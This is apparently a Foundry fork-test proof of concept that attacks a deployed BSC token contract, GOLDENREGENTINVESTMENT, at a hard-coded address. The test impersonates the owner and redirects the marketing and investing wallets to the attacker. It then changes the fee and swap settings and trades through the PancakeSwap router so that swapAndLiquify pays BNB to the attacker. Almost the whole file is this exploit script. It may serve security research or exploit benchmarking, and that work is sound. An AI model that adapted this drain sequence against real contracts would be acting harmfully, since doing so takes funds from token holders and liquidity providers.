pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Minimal interface for the token
interface GOLDENREGENTINVESTMENT {
    function owner() external view returns (address);
    function setExcludedFromFee(address account, bool e) external;
    function setMarketingWallet(address marketingWallet) external;
    function setInvestingWallet(address investingWallet) external;
    function _uniswapV2Pair() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
}

// Interface for Uniswap V2 Router
interface IUniswapV2Router02 {
    function WETH() external pure returns (address);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

// Interface for BEP20 (for WETH)
interface IBEP20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

// WETH interface
interface IWETH {
    function deposit() external payable;
    function withdraw(uint256) external;
}

// Extended token interface - renamed to avoid duplicate declaration
interface GOLDENREGENTINVESTMENT_EXTENDED {
    function owner() external view returns (address);
    function setMarketingWallet(address marketingWallet) external;
    function setInvestingWallet(address investingWallet) external;
    function setPercentageOfLiquidityForMarketing(uint256 marketingFee) external;
    function setSwapAndLiquifyEnabled(bool e) external;
    function setMinimumTokenBalance(uint256 minimumToken) external;
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}



contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0x134C857757308AEeC4c20CA2A583F560a906ed28;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed for fork test
        // The contract is already deployed at TARGET
        // We'll get the owner address in the exploit
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Get the current owner
        address owner = GOLDENREGENTINVESTMENT(TARGET).owner();

        // Record initial BNB balance
        uint256 initialBalance = address(attacker).balance;

        // Start impersonating the owner
        vm.startPrank(owner);

        // Set attacker as marketing wallet to receive marketing fees
        GOLDENREGENTINVESTMENT(TARGET).setMarketingWallet(attacker);

        // Also set investing wallet to attacker to get both halves of marketing fee
        GOLDENREGENTINVESTMENT(TARGET).setInvestingWallet(attacker);

        // Use 99% marketing fee (default) to ensure liquidity addition works
        // Cast to the extended interface to access the missing function
        GOLDENREGENTINVESTMENT_EXTENDED(TARGET).setPercentageOfLiquidityForMarketing(99);

        // Ensure swap and liquify is enabled
        GOLDENREGENTINVESTMENT_EXTENDED(TARGET).setSwapAndLiquifyEnabled(true);

        // Set minimum token balance to a low value so it triggers easily
        GOLDENREGENTINVESTMENT_EXTENDED(TARGET).setMinimumTokenBalance(1);

        // Stop prank
        vm.stopPrank();

        // Get router and WETH addresses
        address routerAddress = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        IUniswapV2Router02 router = IUniswapV2Router02(routerAddress);
        address weth = router.WETH();

        // Give ourselves BNB to work with
        deal(attacker, 100 ether);

        // Wrap BNB to WETH
        IWETH(weth).deposit{value: 20 ether}();
        IBEP20(weth).approve(routerAddress, 20 ether);

        // Buy tokens to generate fees for the contract
        address[] memory path = new address[](2);
        path[0] = weth;
        path[1] = TARGET;

        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            10 ether, // amountIn
            0, // amountOutMin
            path,
            attacker,
            block.timestamp
        );

        // Now sell some tokens back to generate more fees
        uint256 griBalance = GOLDENREGENTINVESTMENT(TARGET).balanceOf(attacker);
        GOLDENREGENTINVESTMENT_EXTENDED(TARGET).approve(routerAddress, griBalance);

        path[0] = TARGET;
        path[1] = weth;

        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            griBalance / 2,
            0,
            path,
            attacker,
            block.timestamp
        );

        // The contract should now have token fees
        // Trigger swapAndLiquify by making a transfer
        // Create a trader address
        address trader = address(0x999);

        // Give trader a small amount of tokens
        uint256 smallAmount = 1 * 10**18;
        GOLDENREGENTINVESTMENT(TARGET).transfer(trader, smallAmount);

        // Make a transfer from trader to trigger swapAndLiquify
        vm.prank(trader);
        GOLDENREGENTINVESTMENT(TARGET).transfer(address(0x888), 1);

        // Check if we received BNB
        uint256 finalBalance = address(attacker).balance;
        require(finalBalance > initialBalance, "No BNB received");
    }






    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

